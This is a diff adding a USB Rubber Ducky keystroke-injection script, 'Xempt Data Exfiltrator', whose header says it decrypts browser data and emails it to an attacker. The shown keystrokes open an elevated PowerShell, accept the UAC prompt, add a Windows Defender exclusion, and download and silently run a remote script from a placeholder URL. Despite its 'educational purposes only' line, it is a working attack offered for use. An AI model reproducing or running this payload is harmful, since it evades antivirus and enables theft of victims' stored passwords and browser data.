@@ -1,0 +1,25 @@
+REM Title:         Xempt Data Exfiltrator (XDE)
+REM Description:   Decrypts all browser data and exports to attackers email
+REM Author:        AnonymousXempt
+REM Props:         https://github.com/moonD4rk for the browser data hack
+REM Version:       1.0
+REM Category:      Exfiltration
+REM Target:        Windows 10 (Powershell)
+REM Attackmodes:   HID
+REM Some editing on your part for download url
+REM This script is for educational purposes only
+
+REM Delay To Enumerate Ducky
+DELAY 3000
+REM Launch Powershell As Admin
+GUI
+STRING powershell
+DELAY 200
+CTRL SHIFT ENTER
+DELAY 1000
+ALT Y
+DELAY 1000
+REM Create New Folder With Exclusion And Launch Script Hidden
+STRING mkdir "$env:temp\XDE"; Add-MpPreference -ExclusionPath "$env:temp\XDE"; powershell -NoP -NonI -W h -Exec Bypass iwr "DOWNLOAD-URL" -outfile "$env:temp\XDE\mail.ps1"; cd $env:temp\XDE; & .\mail.ps1
+ENTER
+
